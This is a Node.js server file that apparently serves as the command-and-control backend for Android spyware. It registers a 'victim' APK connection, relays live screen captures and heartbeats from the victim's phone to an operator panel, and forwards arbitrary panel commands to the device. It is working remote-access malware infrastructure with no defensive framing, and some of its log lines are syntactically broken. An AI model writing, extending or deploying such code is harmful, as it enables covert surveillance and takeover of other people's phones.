const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    maxHttpBufferSize: 1e8 // 100MB for large images
});

let victimSocket = null;
let panelSocket = null;

// Serve panel.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // Victim (APK) connects
    socket.on('victim_connect', (data) => {
        console.log('📱 Victim Connected:', data.deviceId);
        victimSocket = socket;
        if (panelSocket) panelSocket.emit('victim_data', data);
    });

    // Heartbeat from APK
    socket.on('heartbeat', (data) => {
        if (panelSocket) panelSocket.emit('status_update', data);
    });

    // Live Screen from APK
    socket.on('live_screen', (data) => {
        if (panelSocket) panelSocket.emit('live_screen_update', data);
    });

    // Commands from Panel to APK
    socket.on('panel_command', (command) => {
        if (victimSocket) {
            console.log('Forwarding command to victim:', command.type);
            victimSocket.emit(command.type, command.data);
        } else {
            console.log('Victim not connected!');
        }
    });

    socket.on('disconnect', () => {
        if (socket === victimSocket) {
            console.log('Victim Disconnected');
            victimSocket = null;
            if (panelSocket) panelSocket.emit('disconnect');
        } else {
            panelSocket = null;
        }
    });

    // Identify Panel
    panelSocket = socket;
});

const PORT = 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(\n✅ Server is running!);
    console.log(🔗 Panel URL: http://localhost:${PORT});
    console.log(🔗 Local IP: http://[https://full-screen.onrender.com]:${PORT});
});
